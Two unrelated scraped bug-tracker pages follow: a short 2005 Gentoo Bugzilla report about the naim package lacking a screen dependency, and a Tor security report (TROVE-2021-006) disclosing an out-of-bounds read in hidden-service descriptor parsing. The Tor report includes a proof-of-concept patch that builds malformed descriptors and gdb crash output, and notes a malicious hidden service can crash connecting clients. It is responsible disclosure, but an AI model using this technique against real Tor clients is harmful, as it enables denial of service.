[**BugÂ 77658**](show_bug.cgi?id=77658)
- Naim causes freezing in Gentoo

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
Naim causes freezing in Gentoo

| | [Status](page.cgi?id=fields.html#bug_status): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components.") | Gentoo Linux | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Unclassified | | [Component:](describecomponents.cgi?product=Gentoo Linux "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | [OLD] Unspecified ([show other bugs](buglist.cgi?component=%5BOLD%5D%20Unspecified&product=Gentoo%20Linux&bug_status=__open__)) | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | x86 Linux | |  | | | [Importance](page.cgi?id=fields.html#importance): | High normal | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Gentoo Net-im project | |  | | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2005-01-12 04:05 UTC by Aaron Tandy | | --- | --- | | Modified: | 2005-01-25 10:46 UTC ([History](show_activity.cgi?id=77658)) | | CC List: | 0 users | |  | | | [See Also:](page.cgi?id=fields.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Package list:](page.cgi?id=fields.html#cf_stabilisation_atoms "Contains a list of packages (and optionally, architectures) to keyword or stabilize. One fully qualified package per line, optionally followed by a space-delimited list of architectures for that package.") |  | | [Runtime testing required:](page.cgi?id=fields.html#cf_runtime_testing_required "Indicate what level of testing is required. For manual testing following instructions in the bug, choose \"Manual\". For only compile-testing, choose \"No\". For where tests must pass, choose \"Yes\".") | --- | |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [Add an attachment](attachment.cgi?bugid=77658&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=77658&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- |

| [Description](#c0)  Aaron Tandy    2005-01-12 04:05:41 UTC  ``` Naim does not install with the proper dependencies.  'Gawk' and maybe 'screen' need to be installed along with naim, else naim causes Gentoo to freeze requiring a reboot. This occurred after installing gentoo from stage1 using the universal livecd for x86. This is my first post to any bugzilla forum so if I left something out, sorry in advance. ```  [Comment 1](#c1)  Don Seiler (RETIRED)   gentoo-dev  2005-01-25 10:38:10 UTC  ``` Why would screen need to be installed? ```  [Comment 2](#c2)  Don Seiler (RETIRED)   gentoo-dev  2005-01-25 10:40:35 UTC  ``` Ah I see.  --enable-detach is set.  I'll fix this in 0.11.7.3. ```  [Comment 3](#c3)  Don Seiler (RETIRED)   gentoo-dev  2005-01-25 10:46:45 UTC  ``` Added DEPEND on app-misc/screen for 0.11.7.2 and 0.11.7.3.  Not sure where awk comes into things.  Marking this FIXED. ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=77658)
* -Â [XML](show_bug.cgi?ctype=xml&id=77658)
* -Â [Clone This Bug](enter_bug.cgi?cloned_bug_id=77658)
* -Â [Clone In The Same
  Product](enter_bug.cgi?cloned_bug_id=77658&product=Gentoo%20Linux)
* -Â Top of page

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)â€“[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [Help](https://bugzilla.readthedocs.org/en/5.0/using/understanding.html)
  + |
    [NewÂ Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=77658&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=77658&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from bugs.torproject.org_0a9a85ff_20250115_183625.html ===


[Skip to content](#content-body)
GitLab
[![](data:image/gif;base64...)](/ "Homepage")

* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)

# TROVE-2021-006: Out-of-bounds read in desc\_decode\_encryted\_v3

Reported by Sergei Glazunov at Google. This issue is confidential.

---

Greetings,

There's an out-of-bounds read issue in desc\_decode\_encrypted\_v3.

Consider the definition of the R3\_INTRO\_AUTH\_REQUIRED token:

```
/** Descriptor ruleset for the encrypted section. */
static token_rule_t hs_desc_encrypted_v3_token_table[] = {
  T1_START(str_create2_formats, R3_CREATE2_FORMATS, CONCAT_ARGS, NO_OBJ),
  T01(str_intro_auth_required, R3_INTRO_AUTH_REQUIRED, ARGS, NO_OBJ),
  T01(str_single_onion, R3_SINGLE_ONION_SERVICE, ARGS, NO_OBJ),
  END_OF_TABLE
};
```

The macro ARGS indicates that the token can have any number of
arguments (including zero). However, the function
desc\_decode\_encrypted\_v3 expects the token to always have an argument
at index 0:

```
/** Decode the version 3 encrypted section of the given descriptor desc. The
 * desc_encrypted_out will be populated with the decoded data. */
static hs_desc_decode_status_t
desc_decode_encrypted_v3(const hs_descriptor_t *desc,
                         const curve25519_secret_key_t *client_auth_sk,
                         hs_desc_encrypted_data_t *desc_encrypted_out)
{
[...]
  /* Authentication type. It's optional but only once. */
  tok = find_opt_by_keyword(tokens, R3_INTRO_AUTH_REQUIRED);
  if (tok) {
    if (!decode_auth_type(desc_encrypted_out, tok->args[0])) {
      log_warn(LD_REND, "Service descriptor authentication type has "
                        "invalid entry(ies).");
      goto err;
    }
  }
```

As a result, the function may access an out-of-bounds char pointer,
which is then passed to decode\_auth\_type.

The easiest way to reproduce the issue is to apply the following patch
and run one of the hs\_descriptor unit tests. Iâ€™ve also confirmed that
a malicious hidden service can crash clients that are trying to
connect to it on a testnet.

```
diff --git a/src/feature/hs/hs_descriptor.c b/src/feature/hs/hs_descriptor.c
index 0656224e48..0e241a1d1a 100644
--- a/src/feature/hs/hs_descriptor.c
+++ b/src/feature/hs/hs_descriptor.c
@@ -754,14 +754,7 @@ get_inner_encrypted_layer_plaintext(const
hs_descriptor_t *desc)
     smartlist_add_asprintf(lines, "%s %d\n", str_create2_formats,
                            ONION_HANDSHAKE_TYPE_NTOR);

-    if (desc->encrypted_data.intro_auth_types &&
-        smartlist_len(desc->encrypted_data.intro_auth_types)) {
-      /* Put the authentication-required line. */
-      char *buf = smartlist_join_strings(desc->encrypted_data.intro_auth_types,
-                                         " ", 0, NULL);
-      smartlist_add_asprintf(lines, "%s %s\n", str_intro_auth_required, buf);
-      tor_free(buf);
-    }
+    smartlist_add_asprintf(lines, "%s\n", str_intro_auth_required);

     if (desc->encrypted_data.single_onion_service) {
       smartlist_add_asprintf(lines, "%s\n", str_single_onion);
@@ -827,6 +820,15 @@ get_outer_encrypted_layer_plaintext(const
hs_descriptor_t *desc,
     smartlist_add(lines, auth_client_lines);
   }

+
+  char tmp[4001];
+  memset(tmp, 'B', 4000);
+  tmp[4000] = 0;
+
+  for (int i = 0; i < 5; ++i)
+    smartlist_add_asprintf(lines,
+                             "opt %s\n", tmp);
+
   /* create encrypted section */
   {
     smartlist_add_asprintf(lines,
@@ -2673,18 +2675,6 @@ hs_desc_encode_descriptor,(const hs_descriptor_t *desc,
     goto err;
   }

-  /* Try to decode what we just encoded. Symmetry is nice!, but it is
-   * symmetric only if the client auth is disabled. That is, the descriptor
-   * cookie will be NULL. */
-  if (!descriptor_cookie) {
-    ret = hs_desc_decode_descriptor(*encoded_out, &desc->subcredential,
-                                    NULL, NULL);
-    if (BUG(ret != HS_DESC_DECODE_OK)) {
-      ret = -1;
-      goto err;
-    }
-  }
-
   return 0;

  err:
```

gdb output:

```
gdb --args ./src/test/test --no-fork hs_descriptor/decode_descriptor
[...]
Program received signal SIGSEGV, Segmentation fault.
__strchr_sse2 () at ../sysdeps/x86_64/multiarch/../strchr.S:32
32  ../sysdeps/x86_64/multiarch/../strchr.S: No such file or directory.
(gdb) x/i $pc
=> 0x7ffff77b8617 <__strchr_sse2+39>: movdqu xmm0,XMMWORD PTR [rdi]
(gdb) info reg
rax            0x242               578
rbx            0x0                 0
rcx            0x0                 0
rdx            0x0                 0
rsi            0x20                32
rdi            0x4242424242424242  4774451407313060418
rbp            0x7fffffffd9d0      0x7fffffffd9d0
rsp            0x7fffffffd958      0x7fffffffd958
r8             0x0                 0
r9             0x0                 0
r10            0x7ffff78a2ac0      140737346415296
r11            0x7ffff78a33c0      140737346417600
r12            0x0                 0
r13            0x2919ce            2693582
r14            0x3ba8e0            3909856
r15            0x4242424242424242  4774451407313060418
rip            0x7ffff77b8617      0x7ffff77b8617 <__strchr_sse2+39>
[...]
(gdb) bt
#0  __strchr_sse2 () at ../sysdeps/x86_64/multiarch/../strchr.S:32
#1  0x0000000000bc08f7 in smartlist_split_string (sl=0x1789e60,
str=<optimized out>, sep=<optimized out>, flags=<optimized out>,
max=<optimized out>)
    at src/lib/smartlist_core/smartlist_split.c:55
#2  0x00000000009c5dc4 in decode_auth_type (desc=0x17854c0,
list=0x4242424242424242 <error: Cannot access memory at address
0x4242424242424242>)
    at src/feature/hs/hs_descriptor.c:1216
#3  desc_decode_encrypted_v3 (desc=0x1785420,
client_auth_sk=<optimized out>, desc_encrypted_out=<optimized out>) at
src/feature/hs/hs_descriptor.c:2327
#4  0x00000000009c3c32 in hs_desc_decode_encrypted (desc=0x1785420,
client_auth_sk=<optimized out>, desc_encrypted=<optimized out>)
    at src/feature/hs/hs_descriptor.c:2421
#5  0x00000000009c4447 in hs_desc_decode_descriptor (
    encoded=0x17a7dd0 "hs-descriptor 3\ndescriptor-lifetime
180\ndescriptor-signing-key-cert\n-----BEGIN ED25519 CERT-----\n"...,
subcredential=<optimized out>, client_auth_sk=<optimized out>,
desc_out=<optimized out>)
    at src/feature/hs/hs_descriptor.c:2604
#6  0x000000000070cc44 in test_decode_descriptor (arg=<optimized out>)
at src/test/test_hs_descriptor.c:266
#7  0x00000000008e98c7 in testcase_run_bare_ (testcase=0xbf27b8
<hs_descriptor+120>) at src/ext/tinytest.c:107
#8  testcase_run_one (group=<optimized out>, testcase=0xbf27b8
<hs_descriptor+120>) at src/ext/tinytest.c:272
#9  0x00000000008ea4e2 in tinytest_main (c=<optimized out>,
v=<optimized out>, groups=<optimized out>) at src/ext/tinytest.c:454
#10 0x00000000008e8aa1 in main (c=3, v=<optimized out>) at
src/test/testing_common.c:420
```

The out-of-bounds pointer value can be controlled, but itâ€™s extremely
unlikely the issue can be used for anything other than a very limited
info leak.

The issue is reported with no disclosure deadline.

Cheers
Sergei

To upload designs, you'll need to enable LFS and have an admin enable hashed storage. [More information](/help/user/project/issues/design_management.md#prerequisites)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


